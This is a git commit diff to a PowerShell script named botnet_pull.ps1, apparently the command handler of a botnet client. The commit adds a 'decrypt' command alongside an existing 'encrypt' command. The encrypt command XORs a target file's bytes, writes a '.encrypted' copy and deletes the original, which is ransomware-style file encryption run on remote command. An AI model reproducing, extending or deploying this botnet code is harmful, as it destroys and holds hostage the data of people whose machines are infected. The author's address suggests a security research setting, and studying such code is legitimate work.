1b2fee2c988cbe14f954a54079008c032381a829
Jesus Enrique Pacheco Franco <jesus.pacheco@seguridad.unam.mx>
2019-10-18 15:00:11 -0500

    decrypt feature completed

--- botnet_pull.ps1
+++ botnet_pull.ps1
@@ -15,12 +15,25 @@
         
         "encrypt" { # encrypt filePath
 
+            echo $command[1]
+
             $fileAbsolutePath = Resolve-Path $command[1] # Get File's Absolute Path
             $fileBytes = (Format-Hex $fileAbsolutePath).Bytes # Get File's Bytes
             $fileBytes | foreach { $encryptedFile.Add(($_ -bxor 25)) } # Apply XOR to every byte
 
             [System.IO.File]::WriteAllBytes("$fileAbsolutePath" + ".encrypted", $encryptedFile) # Create Encrypted File
             Remove-Item $fileAbsolutePath # Delete Original File
+
+        }
+
+        "decrypt" {
+
+            $fileAbsolutePath = Resolve-Path $command[1] # Get File's Absolute Path
+            $fileBytes = (Format-Hex $fileAbsolutePath).Bytes # Get File's Bytes
+            $fileBytes | foreach { $encryptedFile.Add(($_ -bxor 25)) } # Apply XOR to every byte
+
+            [System.IO.File]::WriteAllBytes($fileAbsolutePath.ProviderPath.Substring(0, $fileAbsolutePath.ProviderPath.Length - 10), $encryptedFile) # Create Encrypted File
+            Remove-Item $fileAbsolutePath # Delete Encrypted File
 
         }
 
